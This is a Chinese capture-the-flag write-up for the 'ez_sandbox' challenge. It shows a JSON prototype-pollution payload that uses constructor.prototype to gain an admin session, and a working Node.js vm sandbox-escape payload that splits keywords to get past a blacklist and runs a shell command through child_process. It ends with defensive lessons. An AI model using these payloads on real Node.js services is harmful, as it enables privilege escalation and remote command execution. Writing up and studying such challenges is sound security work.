# ez_sandbox

## 题目简述

利用分两段：先通过递归 `merge()` 污染 `Object.prototype`，使普通用户在登录时被判定为管理员；再利用 Node.js `vm` 对异常对象的跨上下文访问，从沙箱回到宿主环境并执行命令。源码的字符串黑名单可通过属性下标与字符串拼接绕过。

## 解题过程

### 原型链污染取得管理员会话

`clone(req.body)` 实际调用 `merge({}, source)`。虽然源码跳过了 `__proto__`，但空对象继承的 `constructor` 指向 `Object`，继续递归其 `prototype` 就能写入 `Object.prototype`。

先正常注册用户 `test/test`，再用以下 JSON 登录：

```json
{
  "username": "test",
  "password": "test",
  "constructor": {
    "prototype": {
      "test": "polluted"
    }
  }
}
```

同一登录处理函数随后执行 `username in admins`。`admins` 是普通空对象，`in` 会沿原型链查找，于是从被污染的 `Object.prototype.test` 命中，并把当前 session 的 role 设置为 `admin`。全局清理中间件会在下一请求删除污染属性，但管理员角色已经保存在 session 中。

### 从 vm 沙箱回到宿主环境

`/sandbox` 用 `vm.runInContext()` 执行代码，异常则由宿主代码读取 `e.message`。抛出带 `get` trap 的 Proxy 后，宿主访问 `message` 会触发 trap；此时 `arguments.callee.caller` 可接触沙箱外调用者，再经其 `constructor.constructor` 构造宿主函数并取得 `process`。

```javascript
throw new Proxy({}, {
  get: function () {
    const caller = arguments.callee.caller;
    const proc = (
      caller['constru' + 'ctor']['constru' + 'ctor'](
        'return pro' + 'cess'
      )
    )();
    return proc['mainM' + 'odule']['requi' + 're'](
      'child_pr' + 'ocess'
    )['ex' + 'ecSync']('cat /flag').toString();
  }
});
```

把上述代码作为 JSON 字段 `code` POST 到 `/sandbox`。危险关键词都在源码中被拆开，运行时拼接后才解析；命令输出成为异常的 `message`，最终出现在响应的 `result` 字段。

## 方法总结

原型污染不只存在于显式 `__proto__`，递归合并还必须防御 `constructor.prototype`，并使用自有属性检查及无原型字典。Node.js 的 `vm` 不是面向不可信代码的安全隔离边界；黑名单也无法覆盖 JavaScript 的动态属性访问。应使用独立低权限进程或容器，并限制文件、网络和系统调用能力。
